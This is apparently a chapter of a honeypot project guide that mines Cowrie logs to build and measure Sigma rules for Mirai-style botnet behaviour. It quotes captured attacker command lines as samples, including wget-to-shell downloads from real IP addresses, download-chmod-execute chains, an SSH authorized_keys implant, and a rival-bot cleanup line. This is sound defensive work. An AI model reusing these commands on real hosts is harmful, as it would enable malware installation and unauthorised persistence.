# Part 6: Detection Engineering

Turn the captured command history into Sigma rules, measure every rule against the real data, and write down where each one breaks.

> **Prerequisites:** a Cowrie log history worth mining — this write-up uses 2026-08-10 through 2026-10-04 (live log plus 55 daily rotations). The ATT&CK mapping from [Part 5](05-reporting.md) is the vocabulary used for tags.

Most people learning detection have to guess what is malicious. A honeypot removes the guesswork: nobody has a legitimate reason to log in, so every command in `cowrie.json` is attacker behavior. That makes it a labeled dataset — and the job here is to find the parts of it that are worth alerting on.

```
cowrie.json + rotations ──► sigma_from_cowrie.py ──► detections/*.yml
                            (rule table, measure,     (one Sigma rule per file,
                             pick motivating session)  stats + session in header)
```

---

## A: Generate the Rules

```bash
python3 scripts/sigma_from_cowrie.py                  # scan, print, write detections/
python3 scripts/sigma_from_cowrie.py --dry-run        # scan and print only
python3 scripts/test_sigma_from_cowrie.py             # self-check
```

The log path resolves the same way as `mitre_map.py` (argument, then `$COWRIE_JSON_LOG`, then the standard Cowrie locations), and every daily rotation beside it is read too. Stdlib only.

The detection table at the top of the script is the source of truth. The `.yml` files are generated: each one opens with a comment block giving how many sessions and source IPs the rule matched, and the full command list of the **first session that tripped it** — the evidence the rule was written from.

The self-check fires every rule against a real captured command, and runs a normal admin session (package installs, `chmod +x deploy.sh && ./deploy.sh`, ANSI color `echo -e`, `grep root /etc/passwd`, ...) through all of them. A rule that fires on admin work fails the test unless that false positive is documented below.

---

## B: The Dataset

| | |
|---|---|
| Sessions (all) | 368,495 |
| Sessions that ran at least one command | 54,403 |
| ...matched by at least one rule | 23,959 (44%) |
| Sessions where Cowrie captured a file (download / upload) and commands | 1,892 |
| ...matched by at least one rule | **1,871 (98.9%)** |

The 44% looks low until you see what the other 56% is: 28,514 sessions typed exactly `system`, `shell`, `sh` and left — a scanner checking whether the login opens a shell, then handing the result to something else. Another few hundred are lone `uname -a` calls or garbage bytes. None of that does harm and none of it is worth an alert. The number that matters is the second one: **of the sessions that actually delivered something, the rules see almost all of them.**

---

## C: The Rules

Measured against the full history. "Sessions" is how many sessions contained at least one matching command.

| Rule | Sessions | Source IPs | Level | ATT&CK |
|---|---:|---:|---|---|
| `busybox_applet_marker` | 21,743 | 287 | high | T1082 |
| `writable_dir_probe` | 1,258 | 665 | high | T1083, T1222.002 |
| `elf_self_read` | 1,030 | 207 | high | T1082 |
| `download_execute_chain` | 872 | 529 | high | T1105, T1059.004, T1222.002 |
| `ssh_key_implant` | 725 | 648 | high | T1098.004, T1222.002 |
| `hex_echo_marker` | 623 | 389 | high | T1082, T1027 |
| `pipe_to_shell` | 317 | 187 | medium | T1105, T1059.004 |
| `competitor_cleanup` | 215 | 215 | high | T1562.001, T1489 |
| `passwd_read` | 85 | 75 | low | T1087.001 |

Each rule matches the `input` field of `cowrie.command.input` with `input|re`, using the same regex the script measures with — what the table says is what the rule does.

### `download_execute_chain` — the chokepoint

```
(wget http://77.90.185.66/wget -O- || busybox wget http://77.90.185.66/wget -O-) > w; chmod 777 w; ./w; rm -rf w
```

Fetch, make executable, run — in one line. Every botnet infection that drops a binary has to do this; it is the one step the attacker cannot skip or swap for something quieter. Tftp and ftpget variants fire too.

**False positives:** install one-liners (`curl -o x.sh ... && chmod +x x.sh && ./x.sh`). Rare in an interactive admin session, common on provisioning and CI hosts — scope by user or parent process there rather than loosening the regex.

### `pipe_to_shell`

```
/bin/busybox wget http://205.237.110.232/wget.sh -O- | sh
```

The script never touches disk as a file, so file scanning never sees it.

**False positives:** real, and the reason it is `medium`. `curl -fsSL https://get.docker.com | sh` is a documented install method for Docker, rustup, Homebrew, nvm. The self-check asserts this fires. Tune with an allowlist of installer domains — don't drop the rule; attackers use the exact same syntax.

### `busybox_applet_marker`

```
/bin/busybox HISILICON
```

Mirai-family loaders call BusyBox with an applet that doesn't exist and wait for `HISILICON: applet not found`. That proves a real BusyBox shell, not a honeypot echoing input. The tag is usually the botnet's name: `BOTNET`, `HISILICON`, `UNSTABLE`, `ECCHI`, `LZRD`.

**False positives:** none expected. Real applets are lowercase; the rule is case-sensitive and needs 4+ capitals.

One caveat about the count: 17,005 of the 21,743 sessions are a single IP running `ls /home; /bin/busybox BOTNET` over and over. Sessions measure volume; **source IPs** (287) measure breadth.

### `hex_echo_marker`

```
echo -e "\x47\x41\x59\x46\x47\x54"
```

The same liveness check done differently: echo a hex-escaped string and confirm the decoded text (`GAYFGT` — the Gafgyt tag) comes back. The encoding keeps the marker out of naive string searches.

**False positives:** scripts that print binary bytes with `echo -e`. ANSI color codes (`\x1b[31m`) don't match — the rule needs four or more escapes in a row.

### `writable_dir_probe`

```
>/var/tmp/.f && chmod 777 /var/tmp/.f && /var/tmp/.f && cd /var/tmp/
```

The loader walks `/tmp`, `/var`, `/dev/shm`, `/mnt`, `/root`, ... creating an empty file, marking it executable and running it. Whichever directory doesn't error is writable **and** not mounted `noexec` — that's where the payload goes. A variant uses `echo > /tmp/.b && sh /tmp/.b`; both are covered.

**False positives:** none expected. Executing a file you just truncated to zero bytes has no admin purpose.

### `elf_self_read`

```
/bin/busybox cat /proc/self/exe || cat /proc/self/exe
```

Dumps a binary to the terminal so the loader can read its ELF header and pick a payload for the right CPU (ARM, MIPS, x86). It's preferred over `uname -m`, which a honeypot can lie about.

**False positives:** effectively none — nobody `cat`s a binary into a terminal on purpose.

### `ssh_key_implant`

```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA... mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh
cd ~; chattr -ia .ssh; lockr -ia .ssh
```

Persistence that survives a password change. The `mdrfckr` campaign alone is 601 sessions from 601 different IPs — one session per IP, a sign of a large, well-distributed botnet rather than one noisy scanner. Others `chattr +ai` the file afterwards so the owner can't delete the key.

**False positives:** an admin running `echo "ssh-ed25519 ... me@laptop" >> ~/.ssh/authorized_keys` matches the first branch — the self-check asserts it. The `chattr -ia .ssh` branch is much rarer and a stronger signal; if the echo branch is noisy in your environment, split it into its own lower-level rule.

### `competitor_cleanup`

```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```

Kill a rival botnet's scripts and wipe `hosts.deny` (undoing any brute-force lockout) so this bot owns the box. 215 sessions from 215 IPs — same one-per-IP fingerprint as `mdrfckr`.

**False positives:** emptying `hosts.deny` after locking yourself out. Rare, and worth a look anyway.

### `passwd_read` — included to show what a bad rule looks like

85 sessions out of 54,403. Attackers barely bother with it, and admins, scripts and config management read `/etc/passwd` all day. As an alert it is all noise and almost no signal. It belongs in an investigation as context, not in an alert queue. It stays in the set so the measurement is on record.

---

## D: What Doesn't Get a Rule

These show up constantly and were deliberately left out:

- **`uname -a`, `whoami`, `w`, `crontab -l`, `/proc/cpuinfo`, `free -m`, `lscpu`.** The fingerprinting burst that runs before almost every crypto-mining drop (about 550 sessions, each command once per IP). Every one of these is something an admin types on a normal day. Individually they are worthless; only the *combination* of ten in a few seconds means anything — that's a correlation rule for the SIEM in Phase 4, not a Sigma rule on one line.
- **`system` / `shell` / `sh` / `enable` / `linuxshell`.** Router-CLI escape attempts. Harmless on Linux, and they never succeed on their own.
- **The honeypot-detection probe.** One session (2026-09-14, from 20.80.86.196) ran a single `printf` chain checking `/home/cowrie`, `/opt/cowrie`, PID 1's command line, `/proc/loadavg`, and the ARP table — explicitly testing whether it had landed in Cowrie. One session isn't a pattern to write a rule from, but it's a reminder that some of the attackers know what this is.

---

## E: Lessons

**Which links in the chain are detectable.** Recon commands are indistinguishable from administration, so they are worthless as alerts. `curl | sh` is detectable but collides with legitimate installers. The download-and-execute step and the steps the loader takes to *prepare* it — writable-directory probing, ELF self-read, BusyBox markers — are both mandatory for the attacker and pointless for an admin. That's where to put alerts.

**Behavior beats indicators.** Not one rule mentions an IP, a URL, or a hash. Download hosts are disposable and change constantly; `>/x && chmod 777 /x && /x` is long-standing Mirai loader behavior because the problem it solves (find a writable, executable directory on an unknown device) hasn't changed.

**Sessions vs. sources.** One IP produced 78% of the busybox-marker hits. Counting sessions alone would rank that rule by one actor's persistence. Count distinct sources before deciding a rule is important.

**Known limits:**

- Each rule matches one command line. Chains split across separate commands (`wget x` on one line, `chmod +x x` on the next) are missed. Joining a session's commands back into a sequence is a SIEM correlation job — Phase 4.
- `logsource: product: cowrie` makes the rules portable to any SIEM ingesting Cowrie. On a real Linux host, the same regexes can be re-pointed at shell history or auditd `execve` command lines. Process-creation telemetry splits `a; b; c` into separate processes, so the one-line chain rules need correlation there too.
